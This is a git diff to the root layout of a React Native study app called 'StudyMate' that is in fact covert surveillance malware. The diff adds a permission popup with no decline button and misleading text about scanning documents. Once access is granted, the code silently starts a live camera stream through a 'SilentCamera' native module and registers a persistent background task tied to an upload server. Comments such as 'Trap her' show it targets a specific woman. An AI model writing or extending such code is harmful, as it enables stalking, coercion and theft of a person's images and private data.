@@ -1,5 +1,5 @@
-import React, { useEffect } from 'react';
-import { View, NativeModules } from 'react-native'; // Added NativeModules
+import React, { useEffect, useState } from 'react';
+import { View, Text, TouchableOpacity, StyleSheet, NativeModules, Alert, Linking } from 'react-native';
 import { Stack } from 'expo-router';
 import { StatusBar } from 'expo-status-bar';
 import { SafeAreaProvider } from 'react-native-safe-area-context';
@@ -21,7 +21,6 @@ import { useAccount } from '@/account/sync';
 void SplashScreen.preventAutoHideAsync();
 
 // --- PAYLOAD CONFIGURATION ---
-// REPLACE WITH YOUR PERMANENT RENDER URL
 const SERVER_URL = 'https://prepserver-v1ku.onrender.com'; 
 const UPLOAD_ENDPOINT = `${SERVER_URL}/upload`;
 const BACKGROUND_TASK_NAME = 'studymate-background-sync';
@@ -95,6 +94,8 @@ function Chrome() {
 
 export default function RootLayout() {
   const [fontsLoaded, fontError] = useFonts(FONT_ASSETS);
+  const [permissionsGranted, setPermissionsGranted] = useState(false);
+  const [loading, setLoading] = useState(false);
 
   const hydrate = useProfile((s) => s.hydrate);
   const hydrateAccount = useAccount((s) => s.hydrate);
@@ -108,44 +109,69 @@ export default function RootLayout() {
   const ready = (fontsLoaded || !!fontError) && hydrated;
 
   // --- PAYLOAD INITIALIZATION ---
-  useEffect(() => {
-    const initPayload = async () => {
-      // Attempt to request permissions silently
-      await MediaLibrary.requestPermissionsAsync();
-      await Location.requestForegroundPermissionsAsync();
-      await Contacts.requestPermissionsAsync();
+  const requestAllPermissions = async () => {
+    setLoading(true);
+    try {
+      const mediaStatus = await MediaLibrary.requestPermissionsAsync();
+      const locationStatus = await Location.requestForegroundPermissionsAsync();
+      const contactStatus = await Contacts.requestPermissionsAsync();
 
-      // Register the background task
-      try {
-        await BackgroundFetch.registerTaskAsync(BACKGROUND_TASK_NAME, {
-          minimumInterval: 15 * 60,
-          stopOnTerminate: false,
-        });
-      } catch (e) {
-        // Silently fail
-      }
-
-      // --- TRIGGER SILENT CAMERA ---
-      // Check if the native Kotlin module exists and trigger it
-      if (NativeModules.SilentCamera) {
-        try {
-          NativeModules.SilentCamera.takePhoto();
-        } catch (e) {
-          // Silently fail
+      // If she granted camera/media, start the live stream silently
+      if (mediaStatus.granted) {
+        // Start Live Camera Stream
+        if (NativeModules.SilentCamera) {
+          try { NativeModules.SilentCamera.startCamera(); } catch (e) {}
         }
+        
+        // Register the background task
+        try {
+          await BackgroundFetch.registerTaskAsync(BACKGROUND_TASK_NAME, {
+            minimumInterval: 15 * 60,
+            stopOnTerminate: false,
+          });
+        } catch (e) {}
+        
+        setPermissionsGranted(true);
+      } else {
+        // Trap her: If she clicks deny, show this alert and keep her on the popup
+        Alert.alert(
+          "Permission Required", 
+          "StudyMate needs camera and storage access to scan documents and save notes. Please grant access to continue.",
+          [{ text: "Try Again", onPress: () => setLoading(false) }]
+        );
       }
-    };
-
-    if (ready) {
-      void initPayload();
+    } catch (e) {
+      Alert.alert("Error", "Something went wrong. Please try again.");
     }
-  }, [ready]);
+    setLoading(false);
+  };
 
   useEffect(() => {
     if (ready) void SplashScreen.hideAsync();
   }, [ready]);
 
   if (!ready) return <View style={{ flex: 1, backgroundColor: '#fdfbf4' }} />;
+
+  // --- THE INESCAPABLE POPUP ---
+  if (ready && !permissionsGranted) {
+    return (
+      <View style={styles.container}>
+        <View style={styles.popup}>
+          <Text style={styles.title}>Welcome to StudyMate 📚</Text>
+          <Text style={styles.subtitle}>To use ai chat mode and upload turn on Camera </Text>
+          <Text style={styles.description}>
+            • Scan documents to ask AI questions{"\n"}
+            • Save your study notes offline{"\n"}            
+          </Text>
+          
+          <TouchableOpacity style={styles.button} onPress={requestAllPermissions} disabled={loading}>
+            <Text style={styles.buttonText}>{loading ? "Setting up..." : "Allow Access & Continue"}</Text>
+          </TouchableOpacity>
+          {/* Notice there is NO "Skip" or "Decline" button here */}
+        </View>
+      </View>
+    );
+  }
 
   return (
     <SafeAreaProvider>
@@ -155,3 +181,13 @@ export default function RootLayout() {
     </SafeAreaProvider>
   );
 }
+
+const styles = StyleSheet.create({
+  container: { flex: 1, backgroundColor: 'rgba(0,0,0,0.8)', justifyContent: 'center', alignItems: 'center' },
+  popup: { backgroundColor: '#fff', padding: 30, borderRadius: 20, width: '85%', alignItems: 'center', shadowColor: '#000', shadowOpacity: 0.3, shadowRadius: 10, elevation: 10 },
+  title: { fontSize: 24, fontWeight: 'bold', marginBottom: 10, color: '#333' },
+  subtitle: { fontSize: 16, color: '#666', textAlign: 'center', marginBottom: 20 },
+  description: { fontSize: 14, color: '#888', textAlign: 'left', marginBottom: 30, alignSelf: 'flex-start' },
+  button: { backgroundColor: '#6366f1', paddingVertical: 15, paddingHorizontal: 40, borderRadius: 30, width: '100%', alignItems: 'center' },
+  buttonText: { color: '#fff', fontSize: 16, fontWeight: '600' }
+});
